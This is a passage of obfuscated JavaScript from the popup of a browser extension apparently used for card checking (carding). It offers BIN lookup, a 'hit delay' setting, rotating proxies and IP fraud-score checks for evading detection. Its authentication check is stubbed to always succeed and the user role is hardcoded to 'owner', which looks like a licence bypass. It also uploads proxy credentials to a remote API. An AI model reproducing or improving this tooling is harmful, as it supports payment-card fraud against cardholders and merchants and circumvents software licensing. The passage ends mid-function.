var userRole = "owner";
let authCheckDone = false;
function checkAuthentication() {
  return new Promise(_0x4484fe => {
    authCheckDone = true;
    _0x4484fe(true);
  });
}
checkAuthentication().then(_0x224435 => {
  if (!_0x224435) {
    return;
  }
  document.addEventListener("DOMContentLoaded", function () {
    'use strict';

    chrome.storage.local.remove(["tyagrey_logs", "tyagrey_card_history"], function () {});
    var _0x50ca54 = "https://tyagry.cloud/api.php";
    var _0x12747d = "https://i.ibb.co/fVP9Z2nW/Stripe-icon-square.jpg";
    function _0x1d3308(_0x46e417) {
      return document.getElementById(_0x46e417);
    }
    var _0x15b458 = _0x1d3308("headerPfp");
    var _0x28ebcb = _0x1d3308("headerDot");
    var _0x5e3bc6 = document.querySelector(".logo-text");
    var _0x3969a4 = _0x1d3308("topBinCard");
    var _0x5ca2bc = _0x1d3308("topBinActionBtn");
    var _0x4c75e3 = _0x1d3308("statTopBin");
    userRole = "owner";
    function _0x5afda7() {
      var _0x3e59fc = document.getElementById("hitDelayEnabled");
      var _0x305a98 = document.getElementById("hitDelayMsInput");
      var _0x4b5250 = document.getElementById("hitDelayInputWrap");
      var _0xd7f1a7 = document.getElementById("hitDelayStatus");
      function _0xee48e9(_0x404850) {
        if (!_0x4b5250 || !_0xd7f1a7) {
          return;
        }
        if (_0x404850) {
          _0x4b5250.style.opacity = "1";
          _0x4b5250.style.pointerEvents = "auto";
          var _0x491f82 = _0x305a98 ? _0x305a98.value : 1000;
          _0xd7f1a7.textContent = "Status: Enabled (" + _0x491f82 + "ms custom delay)";
        } else {
          _0x4b5250.style.opacity = "0.5";
          _0x4b5250.style.pointerEvents = "none";
          _0xd7f1a7.textContent = "Status: Disabled (default 1000ms)";
          if (_0x305a98) {
            _0x305a98.value = 1000;
          }
        }
      }
      if (_0x3e59fc) {
        if (userRole === "user") {
          _0x3e59fc.disabled = true;
          _0x3e59fc.checked = false;
          _0xee48e9(false);
          if (_0x305a98) {
            _0x305a98.value = 1000;
          }
          chrome.storage.local.set({
            tyagrey_hit_delay_enabled: false,
            tyagrey_hit_delay_ms: 1000
          });
        } else {
          _0x3e59fc.disabled = false;
          chrome.storage.local.get(["tyagrey_hit_delay_enabled", "tyagrey_hit_delay_ms"], function (_0x47cc3a) {
            var _0x255067 = !!_0x47cc3a.tyagrey_hit_delay_enabled;
            _0x3e59fc.checked = _0x255067;
            _0xee48e9(_0x255067);
            if (_0x305a98) {
              var _0x4efad1 = parseInt(_0x47cc3a && _0x47cc3a.tyagrey_hit_delay_ms, 10);
              if (!isNaN(_0x4efad1) && _0x4efad1 >= 100 && _0x4efad1 <= 10000) {
                _0x305a98.value = _0x4efad1;
              } else {
                _0x305a98.value = 1000;
              }
            }
          });
        }
      }
      var _0x5e6fb7 = document.getElementById("binInput");
      var _0x549907 = document.getElementById("binLookupBtn");
      var _0x2870c1 = document.getElementById("cardTypeSelector");
      var _0x1f89b8 = document.getElementById("showCardsByTypeBtn");
      var _0x155728 = document.getElementById("binLookupReloadBtn");
      var _0x2e1e36 = document.getElementById("binCardTypeSection");
      var _0x1bdbb0 = document.getElementById("binInputSection");
      var _0x3faf0e = document.getElementById("binResultCard");
      var _0x10c922 = document.getElementById("cardTypeResults");
      var _0x47b719 = document.getElementById("binLookupNote");
      var _0x583435 = document.getElementById("binStatsSection");
      var _0x5e7708 = document.getElementById("binUpgradeBanner");
      if (userRole === "user") {
        if (_0x2e1e36) {
          _0x2e1e36.style.display = "none";
        }
        if (_0x1bdbb0) {
          _0x1bdbb0.style.display = "none";
        }
        if (_0x3faf0e) {
          _0x3faf0e.style.display = "none";
        }
        if (_0x10c922) {
          _0x10c922.style.display = "none";
        }
        if (_0x47b719) {
          _0x47b719.style.display = "none";
        }
        if (_0x5e7708) {
          _0x5e7708.style.display = "";
        }
      } else {
        if (_0x2e1e36) {
          _0x2e1e36.style.display = "";
        }
        if (_0x1bdbb0) {
          _0x1bdbb0.style.display = "";
        }
        if (_0x47b719) {
          _0x47b719.style.display = "";
        }
        if (_0x5e7708) {
          _0x5e7708.style.display = "none";
        }
        if (_0x5e6fb7) {
          _0x5e6fb7.disabled = false;
          _0x5e6fb7.placeholder = "Enter BIN (e.g. 424242)";
        }
        if (_0x549907) {
          _0x549907.disabled = false;
          _0x549907.textContent = "🔍 Lookup BIN";
        }
        if (_0x2870c1) {
          _0x2870c1.disabled = false;
        }
        if (_0x1f89b8) {
          _0x1f89b8.disabled = false;
          _0x1f89b8.textContent = "Show BINs";
        }
        if (_0x155728) {
          _0x155728.disabled = false;
          _0x155728.style.opacity = "1";
        }
      }
      if (_0x4c75e3) {
        _0x4c75e3.classList.remove("blurred");
      }
      if (_0x5ca2bc) {
        _0x5ca2bc.style.display = "inline-flex";
        _0x5ca2bc.textContent = "📋";
        _0x5ca2bc.title = "Copy Top BIN";
      }
      if (_0x341ad6) {
        if (userRole === "owner") {
          _0x341ad6.classList.remove("hidden");
        } else {
          _0x341ad6.classList.add("hidden");
        }
      }
      var _0x4b092a = document.getElementById("ownerPanelTabBtn");
      if (_0x4b092a) {
        if (userRole === "owner") {
          _0x4b092a.classList.remove("hidden");
        } else {
          _0x4b092a.classList.add("hidden");
        }
      }
      console.log("[POPUP] Role restrictions applied for role:", userRole);
    }
    var _0x1ad463 = _0x1d3308("helpBtn");
    var _0x5ba3fd = _0x1d3308("helpOverlay");
    var _0x882ace = _0x1d3308("helpCloseBtn");
    var _0x20cb5d = _0x1d3308("ipCheckOverlay");
    var _0x1b68b5 = _0x1d3308("ipCheckCloseBtn");
    var _0x8b897b = _0x1d3308("ipCheckRefreshBtn");
    var _0x2e23d7 = _0x1d3308("ipCheckSettingsBtn");
    var _0x58d276 = _0x1d3308("ipCheckEndpointInput");
    var _0x331e15 = _0x1d3308("ipCheckEndpointSaveBtn");
    var _0x4ee378 = _0x1d3308("ipCheckEndpointWrapper");
    var _0x4efb7a = _0x1d3308("ipCheckToggleIpBtn");
    var _0x5af60b = _0x1d3308("ipCheckIp");
    var _0x5334f4 = _0x1d3308("ipCheckSource");
    var _0x34b446 = _0x1d3308("ipCheckBadge");
    var _0x1d4187 = _0x1d3308("ipCheckScoreText");
    var _0x399a6a = _0x1d3308("ipCheckScorebar");
    var _0x5e8ba6 = _0x1d3308("ipCheckFlag");
    var _0xd3051b = _0x1d3308("ipCheckCountry");
    var _0x471243 = _0x1d3308("ipCheckState");
    var _0x2658de = _0x1d3308("ipCheckCity");
    var _0x4d0601 = _0x1d3308("ipCheckIsp");
    var _0x458fa3 = _0x1d3308("ipCheckFoot");
    var _0xeb47fb = "tyagrey_ipcheck_endpoint";
    var _0x439200 = "https://api.ipify.org?format=json";
    var _0x345137 = "https://api.ipapi.is/?q=";
    var _0x4dfe00 = "";
    var _0xffa970 = false;
    var _0x17a848 = false;
    var _0x1688cb = _0x1d3308("ipFraudEndpointInput");
    var _0x1bc060 = _0x1d3308("ipFraudEndpointSaveBtn");
    if (_0x1ad463) {
      _0x1ad463.addEventListener("click", function () {
        _0x5ba3fd.classList.add("active");
      });
    }
    if (_0x882ace) {
      _0x882ace.addEventListener("click", function () {
        _0x5ba3fd.classList.remove("active");
      });
    }
    if (_0x5ba3fd) {
      _0x5ba3fd.addEventListener("click", function (_0x798ce8) {
        if (_0x798ce8.target === _0x5ba3fd) {
          _0x5ba3fd.classList.remove("active");
        }
      });
    }
    if (_0x1b68b5) {
      _0x1b68b5.addEventListener("click", function () {
        _0x20cb5d.classList.remove("active");
      });
    }
    if (_0x20cb5d) {
      _0x20cb5d.addEventListener("click", function (_0x34f71c) {
        if (_0x34f71c.target === _0x20cb5d) {
          _0x20cb5d.classList.remove("active");
        }
      });
    }
    if (_0x8b897b) {
      _0x8b897b.addEventListener("click", function () {
        _0x550dce(true, true);
      });
    }
    if (_0x4efb7a) {
      _0x4efb7a.addEventListener("click", function () {
        _0x17a848 = !_0x17a848;
        if (_0x5af60b) {
          _0x5af60b.classList.toggle("blurred", !_0x17a848);
        }
        _0x4efb7a.title = _0x17a848 ? "Hide IP" : "Show IP";
      });
    }
    if (_0x2e23d7) {
      _0x2e23d7.addEventListener("click", function () {
        if (_0x58d276) {
          _0x58d276.focus();
        }
      });
    }
    if (_0x331e15) {
      _0x331e15.addEventListener("click", function () {
        if (!_0x58d276) {
          return;
        }
        saveIpCheckEndpoint(_0x58d276.value, function () {
          _0x550dce(true, true);
          _0x4edc0a(true, true);
        });
      });
    }
    var _0x12c8a3 = _0x1d3308("dashboardProxyBtn");
    if (_0x12c8a3) {
      _0x12c8a3.addEventListener("click", function () {
        const _0x32d13c = document.querySelector("[data-tab=\"proxymanager\"]");
        if (_0x32d13c) {
          _0x32d13c.click();
        }
      });
    }
    var _0x2bba6c = _0x1d3308("dashboardRemoveIpBtn");
    var _0x341ad6 = _0x1d3308("ipListTabBtn");
    var _0x123da0 = _0x1d3308("ipListRefreshBtn");
    var _0xd2728 = _0x1d3308("ipListCopyBtn");
    var _0x1accee = _0x1d3308("ipListStatus");
    var _0x9412c6 = _0x1d3308("ipListContainer");
    if (_0x2bba6c) {
      _0x2bba6c.addEventListener("click", function () {
        if (!_0x22b33b) {
          return;
        }
        _0xfed1b4(_0x2bba6c, true, "Removing...");
        chrome.runtime.sendMessage({
          type: "CLEAR_PROXY"
        }, function (_0xe23201) {
          chrome.storage.local.remove(["proxyAuth", "tyagrey_proxy_enabled", "tyagrey_proxy_string", "tyagrey_proxy_info"], function () {
            _0x1161fd();
            _0xfed1b4(_0x2bba6c, false, "Remove IP");
            if (tabBtns && tabBtns[0]) {
              tabBtns[0].click();
            }
          });
        });
      });
    }
    function _0x16d523(_0x1c7b04, _0xc7ee50) {
      console.log("[Legacy Proxy] " + _0xc7ee50 + ": " + _0x1c7b04);
    }
    function _0x50bbe6(_0x1ba84e) {
      console.log("[Legacy Proxy] Setting proxy: " + _0x1ba84e);
    }
    var _0x3106a2 = _0x1d3308("proxyInput");
    var _0x12db0 = _0x1d3308("addProxyBtn");
    var _0x11b194 = _0x1d3308("testProxyBtn");
    var _0x4483ec = _0x1d3308("removeProxyBtn");
    var _0x293855 = _0x1d3308("proxyAutoRotate");
    var _0x4910c2 = _0x1d3308("proxyEnabled");
    var _0x2f4bb1 = _0x1d3308("currentProxyDisplay");
    var _0x4e7eed = null;
    var _0x2b1489 = _0x1d3308("proxyInfoDisplay");
    var _0x2f51d7 = _0x1d3308("proxyStatusIndicator");
    var _0x4b7cb3 = _0x1d3308("savedProxiesList");
    var _0x2b7506 = _0x1d3308("proxyLogs");
    var _0x392f9 = _0x1d3308("proxyManagerMessage");
    function _0x47d8cf() {
      chrome.storage.local.get(["tyagrey_proxy_enabled", "tyagrey_proxy_string", "tyagrey_proxy_info", "tyagrey_proxy_auto_rotate"], function (_0x37acf9) {
        const _0xb1a0e7 = _0x37acf9.tyagrey_proxy_enabled;
        const _0x31452d = _0x37acf9.tyagrey_proxy_string;
        const _0x204fc6 = _0x37acf9.tyagrey_proxy_info;
        const _0x2636fa = _0x37acf9.tyagrey_proxy_auto_rotate;
        if (_0x2f51d7) {
          _0x2f51d7.style.background = _0xb1a0e7 ? "#16a34a" : "#dc2626";
        }
        if (_0x2f4bb1) {
          _0x2f4bb1.textContent = _0x31452d || "No proxy set";
        }
        if (_0x2b1489) {
          if (_0x204fc6) {
            _0x2b1489.textContent = "IP: " + (_0x204fc6.ip || "Unknown") + " | Country: " + (_0x204fc6.country_name || "Unknown") + " | Type: " + (_0x204fc6.ip_type || "Unknown");
          } else {
            _0x2b1489.textContent = "IP: Unknown | Country: Unknown | Type: Unknown";
          }
        }
        if (_0x4910c2) {
          _0x4910c2.checked = !!_0xb1a0e7;
        }
        if (_0x293855) {
          _0x293855.checked = !!_0x2636fa;
          if (_0x2636fa) {
            _0x27a321();
          } else {
            _0x4cdcbe();
          }
        }
      });
    }
    function _0x27a321() {
      if (_0x4e7eed) {
        return;
      }
      console.log("[Proxy] Auto-rotate started");
      _0x3a4bb5("Auto-rotate started");
      _0x4e7eed = setInterval(_0x2068a6, 30000);
      _0x2068a6();
    }
    function _0x4cdcbe() {
      if (!_0x4e7eed) {
        return;
      }
      clearInterval(_0x4e7eed);
      _0x4e7eed = null;
      console.log("[Proxy] Auto-rotate stopped");
      _0x3a4bb5("Auto-rotate stopped");
    }
    function _0x2068a6() {
      chrome.storage.local.get(["tyagrey_saved_proxies", "tyagrey_proxy_string", "tyagrey_proxy_rotate_index"], function (_0x4031c0) {
        const _0x56406b = _0x4031c0.tyagrey_saved_proxies || [];
        if (_0x56406b.length < 2) {
          _0x3a4bb5("Auto-rotate: need 2+ saved proxies");
          return;
        }
        let _0x265765 = _0x4031c0.tyagrey_proxy_rotate_index || 0;
        let _0x171a4f = (_0x265765 + 1) % _0x56406b.length;
        let _0x245327 = _0x56406b[_0x171a4f];
        _0x3a4bb5("Auto-rotate: switching to proxy #" + (_0x171a4f + 1));
        chrome.runtime.sendMessage({
          type: "SET_PROXY",
          proxy: _0x245327
        }, function (_0x3efd49) {
          if (_0x3efd49 && _0x3efd49.success) {
            chrome.storage.local.set({
              tyagrey_proxy_enabled: true,
              tyagrey_proxy_string: _0x245327,
              tyagrey_proxy_rotate_index: _0x171a4f
            }, function () {
              _0x45680a("Auto-rotated to proxy #" + (_0x171a4f + 1), "success");
              _0x3a4bb5("Auto-rotate success: " + _0x245327);
              _0x47d8cf();
            });
          } else {
            var _0x17dee1 = _0x3efd49 && (_0x3efd49.error || _0x3efd49.message) ? String(_0x3efd49.error || _0x3efd49.message) : "Auto-rotate failed";
            _0x45680a(_0x17dee1, "error");
            _0x3a4bb5("Auto-rotate failed: " + _0x17dee1);
          }
        });
      });
    }
    function _0x41fa23(_0x40d1da) {
      if (!_0x4b7cb3) {
        return;
      }
      const _0x10a93a = document.createElement("div");
      _0x10a93a.style.cssText = "display: flex; align-items: center; justify-content: space-between; padding: 8px 12px; margin-bottom: 6px; background: rgba(255,255,255,0.06); border-radius: 6px; font-family: \"JetBrains Mono\", monospace; font-size: 11px;";
      _0x10a93a.innerHTML = "\n        <span style=\"color: #e5e7eb; word-break: break-all;\">" + _0x40d1da + "</span>\n        <div style=\"display: flex; gap: 6px;\">\n          <button class=\"proxy-use-btn\" style=\"padding: 4px 8px; font-size: 10px; border: 1px solid #16a34a; background: #f0fdf4; color: #16a34a; border-radius: 4px; cursor: pointer;\" data-proxy=\"" + _0x40d1da + "\">Use</button>\n          <button class=\"proxy-delete-btn\" style=\"padding: 4px 8px; font-size: 10px; border: 1px solid #dc2626; background: #fee2e2; color: #b91c1c; border-radius: 4px; cursor: pointer;\" data-proxy=\"" + _0x40d1da + "\">×</button>\n        </div>\n      ";
      const _0x336ac9 = _0x10a93a.querySelector(".proxy-use-btn");
      const _0x54be2d = _0x10a93a.querySelector(".proxy-delete-btn");
      _0x336ac9.addEventListener("click", function () {
        _0x5783f7(this.dataset.proxy);
      });
      _0x54be2d.addEventListener("click", function () {
        _0x14d73f(this.dataset.proxy);
        _0x10a93a.remove();
      });
      _0x4b7cb3.appendChild(_0x10a93a);
    }
    function _0x1446c0() {
      if (!_0x4b7cb3) {
        return;
      }
      _0x4b7cb3.innerHTML = "<div class=\"proxy-list-empty\" style=\"color: #6b7280; font-size: 12px; text-align: center; padding: 20px;\">No saved proxies</div>";
      chrome.storage.local.get(["tyagrey_saved_proxies"], function (_0x304279) {
        const _0x187fe9 = _0x304279.tyagrey_saved_proxies || [];
        if (_0x187fe9.length > 0) {
          _0x4b7cb3.innerHTML = "";
          _0x187fe9.forEach(_0x13bb37 => _0x41fa23(_0x13bb37));
        }
      });
    }
    function _0x2b045e(_0x2a8b19, _0x20c98a) {
      chrome.storage.local.get(["tyagrey_saved_proxies"], function (_0x2ecbde) {
        const _0x12ba38 = _0x2ecbde.tyagrey_saved_proxies || [];
        if (userRole === "user" && _0x12ba38.length >= 5) {
          _0x45680a("Maximum 5 proxies allowed for free users. Upgrade to Premium for unlimited proxies!", "error");
          if (typeof _0x20c98a === "function") {
            _0x20c98a(false);
          }
          return;
        }
        if (!_0x12ba38.includes(_0x2a8b19)) {
          _0x12ba38.push(_0x2a8b19);
          chrome.storage.local.set({
            tyagrey_saved_proxies: _0x12ba38
          }, function () {
            _0x41fa23(_0x2a8b19);
            _0x3a4bb5("Added proxy: " + _0x2a8b19);
            if (typeof _0x20c98a === "function") {
              _0x20c98a(true);
            }
          });
        } else if (typeof _0x20c98a === "function") {
          _0x20c98a(true);
        }
      });
    }
    function _0xfed1b4(_0x2b8804, _0x1b896b, _0x33f85a) {
      if (!_0x2b8804) {
        return;
      }
      if (_0x1b896b) {
        if (_0x2b8804.dataset.origText === undefined) {
          _0x2b8804.dataset.origText = _0x2b8804.textContent;
        }
        if (_0x33f85a) {
          _0x2b8804.textContent = _0x33f85a;
        }
        _0x2b8804.disabled = true;
        _0x2b8804.classList.add("loading");
      } else {
        _0x2b8804.disabled = false;
        if (_0x33f85a) {
          _0x2b8804.textContent = _0x33f85a;
        } else if (_0x2b8804.dataset.origText !== undefined) {
          _0x2b8804.textContent = _0x2b8804.dataset.origText;
          delete _0x2b8804.dataset.origText;
        }
        _0x2b8804.classList.remove("loading");
      }
    }
    function _0x14d73f(_0xd6d83a) {
      chrome.storage.local.get(["tyagrey_saved_proxies"], function (_0x2650db) {
        const _0x340551 = _0x2650db.tyagrey_saved_proxies || [];
        const _0x5063d7 = _0x340551.filter(_0x5bf727 => _0x5bf727 !== _0xd6d83a);
        chrome.storage.local.set({
          tyagrey_saved_proxies: _0x5063d7
        }, function () {
          _0x3a4bb5("Removed proxy: " + _0xd6d83a);
        });
      });
    }
    function _0x3a4bb5(_0x49d035) {
      if (!_0x2b7506) {
        return;
      }
      const _0x2b1299 = new Date().toLocaleTimeString();
      const _0xb1883b = document.createElement("div");
      _0xb1883b.style.cssText = "margin-bottom: 4px; color: #9ca3af; font-size: 10px;";
      _0xb1883b.textContent = "[" + _0x2b1299 + "] " + _0x49d035;
      _0x2b7506.appendChild(_0xb1883b);
      _0x2b7506.scrollTop = _0x2b7506.scrollHeight;
    }
    function _0x5783f7(_0x2d9749, _0x2139b2) {
      if (!_0x2d9749) {
        _0x45680a("Please enter a proxy string", "error");
        if (typeof _0x2139b2 === "function") {
          _0x2139b2(false);
        }
        return;
      }
      _0x45680a("Validating proxy...", "info");
      chrome.runtime.sendMessage({
        type: "CHECK_PROXY_LIVE",
        proxy: _0x2d9749
      }, function (_0x21c572) {
        if (chrome.runtime.lastError) {
          _0x45680a(chrome.runtime.lastError.message || "Proxy validation failed", "error");
          if (typeof _0x2139b2 === "function") {
            _0x2139b2(false);
          }
          return;
        }
        var _0x2d7e25 = _0x21c572 && (_0x21c572.success === true || _0x21c572.alive === true || _0x21c572.live === true || _0x21c572.ok === true || _0x21c572.status && ["ok", "alive", "success", "accepted"].includes(String(_0x21c572.status).toLowerCase()));
        if (!_0x2d7e25) {
          var _0x261658 = _0x21c572 && (_0x21c572.error || _0x21c572.message || _0x21c572.status) ? String(_0x21c572.error || _0x21c572.message || _0x21c572.status) : "Proxy validation failed";
          _0x45680a(_0x261658, "error");
          if (typeof _0x2139b2 === "function") {
            _0x2139b2(false);
          }
          return;
        }
        chrome.runtime.sendMessage({
          type: "SET_PROXY",
          proxy: _0x2d9749,
          info: _0x21c572
        }, function (_0x175fdb) {
          if (_0x175fdb && _0x175fdb.success) {
            const _0x24be44 = {
              ip: _0x21c572 && _0x21c572.proxy_ip ? _0x21c572.proxy_ip : "Unknown",
              country_name: _0x21c572 && _0x21c572.country_name ? _0x21c572.country_name : "Unknown",
              ip_type: _0x21c572 && _0x21c572.ip_type ? _0x21c572.ip_type : "Unknown"
            };
            chrome.storage.local.set({
              tyagrey_proxy_enabled: true,
              tyagrey_proxy_string: _0x2d9749,
              tyagrey_proxy_info: _0x24be44
            }, function () {
              _0x3a986f(_0x2d9749);
              _0x45680a("Proxy set successfully!", "success");
              _0x47d8cf();
              if (_0x4bba41 === "dashboard") {
                _0x115320();
              }
              _0x3a4bb5("Set active proxy: " + _0x2d9749);
              if (typeof _0x2139b2 === "function") {
                _0x2139b2(true);
              }
            });
          } else {
            var _0x49e97c = _0x175fdb && (_0x175fdb.error || _0x175fdb.message) ? String(_0x175fdb.error || _0x175fdb.message) : "Failed to set proxy";
            _0x45680a(_0x49e97c, "error");
            if (typeof _0x2139b2 === "function") {
              _0x2139b2(false);
            }
          }
        });
      });
    }
    function _0x45680a(_0x1b7129, _0xa43c5a) {
      if (!_0x392f9) {
        return;
      }
      _0x392f9.textContent = _0x1b7129;
      _0x392f9.style.display = "block";
      if (_0xa43c5a === "error") {
        _0x392f9.style.background = "#fee2e2";
        _0x392f9.style.color = "#b91c1c";
        _0x392f9.style.border = "1px solid #fecaca";
      } else if (_0xa43c5a === "success") {
        _0x392f9.style.background = "#f0fdf4";
        _0x392f9.style.color = "#16a34a";
        _0x392f9.style.border = "1px solid #bbf7d0";
      } else {
        _0x392f9.style.background = "#f0f8ff";
        _0x392f9.style.color = "#0f4e8c";
        _0x392f9.style.border = "1px solid #bfdbfe";
      }
      if (_0xa43c5a === "success") {
        setTimeout(function () {
          if (_0x392f9) {
            _0x392f9.style.display = "none";
          }
        }, 3000);
      }
      _0x3a4bb5(_0xa43c5a + ": " + _0x1b7129);
    }
    if (_0x12db0) {
      _0x12db0.addEventListener("click", function () {
        const _0x54e201 = _0x3106a2.value.trim();
        if (!_0x54e201) {
          _0x45680a("Please enter a proxy string", "error");
          return;
        }
        _0xfed1b4(_0x12db0, true, "Adding...");
        _0x2b045e(_0x54e201, function (_0x3e96c9) {
          _0x3106a2.value = "";
          if (!_0x3e96c9) {
            _0xfed1b4(_0x12db0, false, "Add");
            return;
          }
          _0x5783f7(_0x54e201, function (_0x1f4740) {
            if (_0x1f4740) {
              _0xfed1b4(_0x12db0, false, "Added!");
              setTimeout(function () {
                _0xfed1b4(_0x12db0, false, "Add");
              }, 900);
            } else {
              _0xfed1b4(_0x12db0, false, "Add");
            }
          });
        });
      });
    }
    if (_0x11b194) {
      _0x11b194.addEventListener("click", function () {
        const _0x4f6306 = _0x3106a2.value.trim();
        if (!_0x4f6306) {
          _0x45680a("Please enter a proxy to test", "error");
          return;
        }
        _0xfed1b4(_0x11b194, true, "Testing...");
        chrome.runtime.sendMessage({
          type: "CHECK_PROXY_LIVE",
          proxy: _0x4f6306
        }, function (_0x84700d) {
          _0xfed1b4(_0x11b194, false, "Test Proxy");
          if (chrome.runtime.lastError) {
            _0x45680a(chrome.runtime.lastError.message || "Test failed", "error");
            return;
          }
          var _0x611780 = _0x84700d && (_0x84700d.success === true || _0x84700d.alive === true || _0x84700d.live === true || _0x84700d.ok === true || _0x84700d.status && ["ok", "alive", "success", "accepted"].includes(String(_0x84700d.status).toLowerCase()));
          if (_0x611780) {
            _0x45680a("Proxy is working!", "success");
          } else {
            var _0x54bd52 = _0x84700d && (_0x84700d.error || _0x84700d.message || _0x84700d.status) ? String(_0x84700d.error || _0x84700d.message || _0x84700d.status) : "Proxy test failed";
            _0x45680a(_0x54bd52, "error");
          }
        });
      });
    }
    if (_0x4483ec) {
      _0x4483ec.addEventListener("click", function () {
        _0xfed1b4(_0x4483ec, true, "Removing...");
        _0x4cdcbe();
        chrome.runtime.sendMessage({
          type: "CLEAR_PROXY"
        }, function (_0x21c46a) {
          chrome.storage.local.remove(["proxyAuth", "tyagrey_proxy_enabled", "tyagrey_proxy_string", "tyagrey_proxy_info"], function () {
            _0x45680a("Proxy removed", "success");
            _0x47d8cf();
            _0x3a4bb5("Removed active proxy");
            _0xfed1b4(_0x4483ec, false, "Remove Proxy");
          });
        });
      });
    }
    if (_0x4910c2) {
      _0x4910c2.addEventListener("change", function () {
        if (!this.checked) {
          _0x4cdcbe();
          chrome.runtime.sendMessage({
            type: "CLEAR_PROXY"
          }, function (_0x63e612) {
            if (_0x63e612 && _0x63e612.success) {
              chrome.storage.local.set({
                tyagrey_proxy_enabled: false
              }, function () {
                _0x47d8cf();
                _0x3a4bb5("Disabled proxy");
              });
            } else {
              var _0x404680 = _0x63e612 && (_0x63e612.error || _0x63e612.message) ? String(_0x63e612.error || _0x63e612.message) : "Failed to clear proxy";
              _0x45680a(_0x404680, "error");
            }
          });
        } else {
          chrome.storage.local.set({
            tyagrey_proxy_enabled: true
          }, function () {
            _0x47d8cf();
            _0x3a4bb5("Enabled proxy");
          });
        }
      });
    }
    if (_0x293855) {
      _0x293855.addEventListener("change", function () {
        var _0x996ddd = this.checked;
        chrome.storage.local.set({
          tyagrey_proxy_auto_rotate: _0x996ddd
        }, function () {
          if (_0x996ddd) {
            _0x27a321();
          } else {
            _0x4cdcbe();
          }
          _0x3a4bb5((_0x996ddd ? "Enabled" : "Disabled") + " auto-rotate");
        });
      });
    }
    if (_0x3106a2) {
      _0x3106a2.addEventListener("keypress", function (_0x457d48) {
        if (_0x457d48.key === "Enter") {
          _0x12db0.click();
        }
      });
    }
    function _0x17b0c7(_0x1d468e) {
      var _0xdf12cb = {
        proxy_string: _0x1d468e,
        ip: "",
        port: "",
        username: "",
        password: ""
      };
      if (!_0x1d468e) {
        return _0xdf12cb;
      }
      var _0x38d9ec = _0x1d468e.split(":");
      if (_0x38d9ec.length === 2) {
        _0xdf12cb.ip = _0x38d9ec[0].trim();
        _0xdf12cb.port = _0x38d9ec[1].trim();
      } else if (_0x38d9ec.length >= 3) {
        _0xdf12cb.port = _0x38d9ec.pop().trim();
        _0xdf12cb.ip = _0x38d9ec.pop().trim();
        var _0x160e87 = _0x38d9ec.join(":").trim();
        if (_0x160e87) {
          var _0x4aff01 = _0x160e87.split(":");
          _0xdf12cb.username = _0x4aff01.shift() || "";
          _0xdf12cb.password = _0x4aff01.join(":") || "";
        }
      }
      return _0xdf12cb;
    }
    function _0x2e2395(_0x2acf45, _0x289055) {
      if (!_0x2acf45) {
        _0x289055(0);
        return;
      }
      var _0x2bacfb = "https://api.ipapi.is/?q=" + encodeURIComponent(_0x2acf45);
      var _0x9bd97a = new AbortController();
      var _0x349a83 = setTimeout(function () {
        _0x9bd97a.abort();
      }, 5000);
      fetch(_0x2bacfb, {
        signal: _0x9bd97a.signal
      }).then(function (_0x2278fb) {
        clearTimeout(_0x349a83);
        if (_0x2278fb.ok) {
          return _0x2278fb.json();
        }
        throw new Error("IP score fetch failed");
      }).then(function (_0x89e0) {
        var _0x581449 = _0x89e0 && typeof _0x89e0.fraud_score === "number" ? Math.round(_0x89e0.fraud_score) : 0;
        _0x289055(_0x581449);
      }).catch(function (_0x310a16) {
        clearTimeout(_0x349a83);
        console.warn("[POPUP] Could not fetch IP score:", _0x310a16);
        _0x289055(0);
      });
    }
    function _0x3a986f(_0x5cafa7) {
      if (!_0xc81f0 || !_0x5cafa7) {
        return;
      }
      var _0x5d7baf = _0x17b0c7(_0x5cafa7);
      _0x2e2395(_0x5d7baf.ip, function (_0x3826ee) {
        var _0x29e727 = {
          token: _0xc81f0,
          proxy_data: {
            proxy_string: _0x5cafa7,
            ip: _0x5d7baf.ip,
            port: _0x5d7baf.port,
            username: _0x5d7baf.username,
            password: _0x5d7baf.password
          },
          proxy_ip: _0x5d7baf.ip,
          proxy_string: _0x5cafa7,
          ip_score: _0x3826ee
        };
        _0x59e7fa("save-user-data", _0x29e727).then(function (_0xaac3a) {
          if (!_0xaac3a || !_0xaac3a.success) {
            console.warn("[POPUP] Unable to save proxy data to cloud", _0xaac3a && _0xaac3a.message);
          }
        });
      });
    }
    var _0x52c9d1 = _0x1d3308("ipFraudCheckBtn");
    var _0xd99aee = _0x1d3308("ipFraudRefreshBtn");
    var _0x5a396b = _0x1d3308("ipFraudSettingsBtn");
    var _0x2c6318 = _0x1d3308("ipFraudReloadBtn");
    var _0x440506 = _0x1d3308("ipFraudResultCard");
    var _0x254a5c = _0x1d3308("ipFraudIcon");
    var _0xfc9f7c = _0x1d3308("ipFraudStatus");
    var _0x6cf872 = _0x1d3308("ipFraudDetails");
    var _0x50c3e9 = _0x1d3308("ipFraudIp");
    var _0x5f185c = _0x1d3308("ipFraudCountry");
    var _0x5d1ec2 = _0x1d3308("ipFraudCity");
    var _0x5d412d = _0x1d3308("ipFraudIsp");
    var _0x1d5397 = _0x1d3308("ipFraudScore");
    var _0x452fa5 = _0x1d3308("ipFraudScorebar");
    var _0x44f711 = false;
    var _0x446570 = false;
    var _0x2f1d79 = _0x1d3308("ipFraudOrg");
    var _0x5c126b = _0x1d3308("ipFraudAsn");
    var _0x17672e = _0x1d3308("ipFraudCountryCode");
    var _0x1b1b58 = _0x1d3308("ipFraudRegion");
    var _0x26d834 = _0x1d3308("ipFraudLatitude");
    var _0x355969 = _0x1d3308("ipFraudLongitude");
    var _0x1b3724 = _0x1d3308("ipFraudTimeZone");
    var _0x593b5c = _0x1d3308("ipFraudProxy");
    var _0x19bffc = _0x1d3308("ipFraudConnectionType");
    var _0x503749 = _0x1d3308("ipFraudOperatorName");
    var _0x280edb = _0x1d3308("ipFraudOsHighestClass");
    var _0x27594a = _0x1d3308("ipFraudProxyUsed");
    var _0xb89c2c = _0x1d3308("ipFraudAuthMethod");
    if (_0x2c6318) {
      _0x2c6318.addEventListener("click", function () {
        _0x4edc0a(true, true);
      });
    }
    if (_0x52c9d1) {
      _0x52c9d1.addEventListener("click", function () {
        _0x550dce(true, true);
      });
    }
    if (_0xd99aee) {
      _0xd99aee.addEventListener("click", function () {
        _0x550dce(true, true);
      });
    }
    if (_0x1bc060) {
      _0x1bc060.addEventListener("click", function () {
        if (!_0x1688cb) {
          return;
        }
        var _0x2b64ab = _0x1688cb.value.trim();
        _0x4dfe00 = _0x2b64ab;
        var _0x2112b0 = {
          [_0xeb47fb]: _0x4dfe00
        };
        chrome.storage.local.set(_0x2112b0, function () {
